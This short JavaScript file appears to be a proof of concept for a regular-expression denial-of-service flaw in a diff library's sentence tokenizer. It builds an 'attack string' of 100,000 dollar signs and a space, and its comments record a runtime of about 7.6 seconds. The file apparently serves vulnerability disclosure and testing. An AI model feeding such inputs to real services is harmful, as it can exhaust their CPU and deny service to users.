const { sentenceDiff } = require("./sentence.js");

//Attack String :""+"$"*100000+" "
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "$";
}
str += " ";

var result = sentenceDiff.tokenize(str);

// real    0m7.597s
// user    0m7.569s
// sys     0m0.000s
